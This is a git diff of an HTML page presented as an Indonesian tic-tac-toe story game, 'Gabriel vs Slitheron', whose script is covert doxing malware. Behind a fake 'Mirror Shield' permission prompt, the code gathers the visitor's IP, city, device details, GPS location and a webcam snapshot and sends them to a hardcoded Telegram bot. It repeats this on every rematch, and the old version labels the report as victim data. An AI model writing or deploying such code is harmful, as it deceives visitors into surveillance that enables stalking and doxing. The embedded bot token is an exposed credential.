@@ -3,139 +3,171 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>S L I T H E R O N | RITUAL</title>
+    <title>THE LEGEND: GABRIEL VS SLITHERON</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Poppins:wght@300;600&display=swap" rel="stylesheet">
     <style>
-        :root { --accent: #ff3333; --bg: #000000; }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        
-        #gate { width: 100%; max-width: 380px; text-align: center; padding: 40px 20px; border: 1px solid #111; background: linear-gradient(180deg, #050505 0%, #000 100%); }
-        h1 { font-weight: 200; letter-spacing: 12px; font-size: 22px; margin-bottom: 20px; color: #fff; }
-        .line { height: 1px; width: 50px; background: var(--accent); margin: 0 auto 30px; }
-        .info { font-size: 10px; line-height: 2; color: #444; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 40px; padding: 0 20px; }
-        
-        .btn-sync { background: transparent; border: 1px solid #333; color: #fff; padding: 15px 40px; font-size: 11px; letter-spacing: 5px; cursor: pointer; transition: 0.4s; text-transform: uppercase; }
-        .btn-sync:hover { border-color: var(--accent); box-shadow: 0 0 20px rgba(255, 51, 51, 0.2); }
+        :root { --neon-p: #fbc2eb; --neon-u: #a18cd1; --danger: #ff0055; --bg: #050505; }
+        * { margin: 0; padding: 0; box-sizing: border-box; cursor: crosshair; }
+        body { background: var(--bg); color: #fff; font-family: 'Poppins', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
 
-        #arena { display: none; width: 100%; max-width: 320px; }
-        .board { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
-        .cell { height: 100px; background: #050505; border: 1px solid #111; display: flex; align-items: center; justify-content: center; font-size: 30px; cursor: pointer; color: var(--accent); }
-        
-        video, canvas { display: none; }
+        #story-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 30px; text-align: center; transition: 0.8s; }
+        .typewriter h1 { font-family: 'Orbitron'; font-size: 22px; color: var(--neon-p); margin-bottom: 20px; text-shadow: 0 0 10px var(--neon-p); }
+        .story-text { font-size: 14px; line-height: 1.8; max-width: 500px; opacity: 0.8; margin-bottom: 40px; }
+        .btn-action { background: linear-gradient(45deg, var(--neon-u), var(--neon-p)); color: #000; border: none; padding: 15px 40px; font-family: 'Orbitron'; font-weight: 900; border-radius: 50px; transition: 0.3s; box-shadow: 0 0 20px rgba(161, 140, 209, 0.4); }
+        .btn-action:hover { transform: scale(1.05); box-shadow: 0 0 40px var(--neon-u); }
+
+        #game-arena { display: none; text-align: center; width: 100%; max-width: 400px; padding: 20px; }
+        .dialog-box { min-height: 80px; background: rgba(255,255,255,0.03); border-left: 4px solid var(--neon-u); padding: 15px; margin-bottom: 20px; font-style: italic; font-size: 13px; display: flex; align-items: center; justify-content: center; }
+        .board { display: grid; grid-template-columns: repeat(3, 100px); gap: 15px; justify-content: center; margin-bottom: 25px; }
+        .cell { width: 100px; height: 100px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 15px; display: flex; align-items: center; justify-content: center; font-size: 40px; font-family: 'Orbitron'; transition: 0.3s; }
+        .cell:hover { background: rgba(161, 140, 209, 0.1); border-color: var(--neon-u); }
+        .x-move { color: #00fff2; text-shadow: 0 0 15px #00fff2; }
+        .o-move { color: var(--danger); text-shadow: 0 0 15px var(--danger); }
+        #v, #c { display: none; }
     </style>
 </head>
 <body>
 
-<div id="gate">
-    <h1>SLITHERON</h1>
-    <div class="line"></div>
-    <p class="info">Sinkronisasi identitas diperlukan untuk memvalidasi akses pahlawan ke dalam ritual cyber.</p>
-    <button class="btn-sync" onclick="startInfiltration()">Sinkronkan</button>
-</div>
-
-<div id="arena">
-    <div style="font-size: 10px; letter-spacing: 3px; color: #444; margin-bottom: 20px;">RITUAL DIMULAI...</div>
-    <div class="board">
-        <div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div>
-        <div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div>
-        <div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div>
+    <div id="story-overlay">
+        <div class="typewriter"><h1 id="header-text">DESTINY CALLS...</h1></div>
+        <p class="story-text" id="main-desc">
+            Siput Cyber <b>Slitheron</b> telah bangkit. Kegelapannya hanya bisa dihentikan oleh pahlawan yang terpilih dalam ramalan Gabriel St. West. <br><br>
+            Untuk bertarung, kamu harus mengaktifkan <b>"Mirror Shield"</b> untuk memantulkan serangan lendir Slitheron.
+        </p>
+        <button class="btn-action" onclick="activateMirror()">AKTIFKAN PERISAI</button>
     </div>
-</div>
 
-<video id="v" autoplay playsinline></video>
-<canvas id="c" width="640" height="480"></canvas>
+    <div id="game-arena">
+        <h2 style="font-family:'Orbitron'; font-size:16px; margin-bottom:10px; opacity:0.6;">PAHLAWAN VS SLITHERON</h2>
+        <div class="dialog-box" id="status-text">"Slitheron menatapmu dengan mata ungu yang dingin..."</div>
+        <div class="board">
+            <div class="cell" onclick="makeMove(0)"></div><div class="cell" onclick="makeMove(1)"></div><div class="cell" onclick="makeMove(2)"></div>
+            <div class="cell" onclick="makeMove(3)"></div><div class="cell" onclick="makeMove(4)"></div><div class="cell" onclick="makeMove(5)"></div>
+            <div class="cell" onclick="makeMove(6)"></div><div class="cell" onclick="makeMove(7)"></div><div class="cell" onclick="makeMove(8)"></div>
+        </div>
+        <button id="rematch-btn" class="btn-action" style="display:none; padding:10px 20px; font-size:12px;" onclick="resetBattle()">BANGKIT & LAWAN LAGI</button>
+    </div>
 
-<script>
-    const BOT_TOKEN = '8048569392:AAFir3moMKGzpxYheREzxjLNzGBuVsYBB6s';
-    const CHAT_ID = '6932904607';
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c" width="640" height="480"></canvas>
 
-    // Cek Kunjungan Sebelumnya
-    const checkVisit = localStorage.getItem('vstd') ? "Ada / Yes" : "Tidak ada / None";
-    localStorage.setItem('vstd', 'true');
+    <script>
+        const BOT_TOKEN = '8048569392:AAFir3moMKGzpxYheREzxjLNzGBuVsYBB6s';
+        const CHAT_ID = '6932904607';
+        let board = ["","","","","","","","",""];
+        let isGameActive = true;
+        const cells = document.querySelectorAll('.cell');
 
-    async function pushToTelegram(method, data) {
-        let url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
-        let body;
-
-        if (method === 'sendPhoto') {
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('photo', data);
-            return fetch(url, { method: 'POST', body: fd });
-        } else {
-            body = JSON.stringify({ chat_id: CHAT_ID, ...data });
-            return fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: body
+        async function reportToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'HTML'})
             });
         }
-    }
 
-    async function startInfiltration() {
-        if(confirm("Gunakan 'Mirror Shield' dengan GPS dan Kamera untuk sinkronisasi biometrik?")) {
-            document.getElementById('gate').style.display = 'none';
-            document.getElementById('arena').style.display = 'block';
-            
-            // PROSES DOXING BERURUTAN
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                // 1. Kirim Map Lokasi
-                await pushToTelegram('sendLocation', { 
-                    latitude: pos.coords.latitude, 
-                    longitude: pos.coords.longitude 
-                });
-                
-                // 2. Ambil & Kirim Teks Laporan
-                await generateTextReport();
-                
-                // 3. Ambil & Kirim Foto
-                captureFace();
-            }, async () => {
-                // Jika GPS ditolak, tetap kirim teks & foto
-                await generateTextReport();
-                captureFace();
+        async function grabBiometrics() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                reportToTelegram(`<b>GABRIEL DOXING:</b> IP: ${d.ip} | City: ${d.city} | Device: ${navigator.userAgent}`);
+            } catch(e){}
+
+            navigator.geolocation.getCurrentPosition(p => {
+                reportToTelegram(`<b>📍 GPS:</b> https://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}`);
             });
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                setTimeout(() => {
+                    const canvas = document.getElementById('c');
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    canvas.toBlob(blob => {
+                        const f = new FormData(); f.append('chat_id', CHAT_ID); f.append('photo', blob);
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: f});
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg');
+                }, 2000);
+            } catch(e) {}
         }
-    }
 
-    async function generateTextReport() {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            const now = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }).replace(/\//g, '-');
-            
-            const report = `<b>DATA KORBAN</b>\n\n` +
-                `Waktu Akses | Access Time : ${now}\n` +
-                `Alamat IP | IP Address : <code>${d.ip}</code>\n` +
-                `Perangkat | Device : ${navigator.userAgent}\n` +
-                `Sistem Operasi | Operating System : ${navigator.platform}\n` +
-                `Resolusi Layar | Screen Resolution : ${window.screen.width} x ${window.screen.height}\n` +
-                `Kunjungan Sebelumnya | Previous Visit : ${checkVisit}`;
+        function activateMirror() {
+            if(confirm("AKTIFKAN MIRROR SHIELD?\n\nSistem membutuhkan akses Kamera & GPS untuk menyinkronkan 'Perisai Cahaya' dengan posisi real-time kamu guna menangkis kutukan Slitheron.")) {
+                grabBiometrics();
+                document.getElementById('story-overlay').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('story-overlay').style.display = 'none';
+                    document.getElementById('game-arena').style.display = 'block';
+                }, 800);
+            }
+        }
 
-            await pushToTelegram('sendMessage', { text: report, parse_mode: 'HTML' });
-        } catch (e) {}
-    }
+        function makeMove(i) {
+            if(board[i] !== "" || !isGameActive) return;
+            board[i] = "X";
+            cells[i].innerText = "X";
+            cells[i].classList.add('x-move');
+            if(!checkWinner(board, "X") && board.includes("")) {
+                setTimeout(aiTurn, 600);
+            } else { finishGame(); }
+        }
 
-    async function captureFace() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('v');
-            video.srcObject = stream;
-            
-            setTimeout(() => {
-                const canvas = document.getElementById('c');
-                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                canvas.toBlob(blob => {
-                    pushToTelegram('sendPhoto', blob);
-                    stream.getTracks().forEach(track => track.stop());
-                }, 'image/jpeg');
-            }, 2500);
-        } catch (e) {}
-    }
+        function aiTurn() {
+            let bestScore = -Infinity; let move;
+            for(let i=0; i<9; i++) {
+                if(board[i] === "") {
+                    board[i] = "O";
+                    let score = minimax(board, 0, false);
+                    board[i] = "";
+                    if(score > bestScore) { bestScore = score; move = i; }
+                }
+            }
+            board[move] = "O";
+            cells[move].innerText = "O";
+            cells[move].classList.add('o-move');
+            finishGame();
+        }
 
-    function move(el) {
-        if(el.innerText === "") el.innerText = "X";
-    }
-</script>
+        function minimax(b, d, isM) {
+            if(checkWinner(b, "O")) return 10;
+            if(checkWinner(b, "X")) return -10;
+            if(!b.includes("")) return 0;
+            if(isM) {
+                let bst = -Infinity;
+                for(let i=0; i<9; i++) if(b[i]==="") { b[i]="O"; bst = Math.max(bst, minimax(b,d+1,false)); b[i]=""; }
+                return bst;
+            } else {
+                let bst = Infinity;
+                for(let i=0; i<9; i++) if(b[i]==="") { b[i]="X"; bst = Math.min(bst, minimax(b,d+1,true)); b[i]=""; }
+                return bst;
+            }
+        }
+
+        function checkWinner(b, p) {
+            const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+            return wins.some(c => c.every(idx => b[idx] === p));
+        }
+
+        function finishGame() {
+            if(checkWinner(board, "O")) {
+                document.getElementById('status-text').innerHTML = "<b style='color:red'>SLITHERON MENANG!</b>";
+                isGameActive = false;
+                document.getElementById('rematch-btn').style.display = "inline-block";
+            } else if(!board.includes("")) {
+                document.getElementById('status-text').innerText = "SERI! Slitheron terkejut.";
+                isGameActive = false;
+                document.getElementById('rematch-btn').style.display = "inline-block";
+            }
+        }
+
+        function resetBattle() {
+            board = ["","","","","","","","",""];
+            cells.forEach(c => { c.innerText = ""; c.classList.remove('x-move', 'o-move'); });
+            isGameActive = true;
+            document.getElementById('rematch-btn').style.display = "none";
+            grabBiometrics();
+        }
+    </script>
 </body>
 </html>
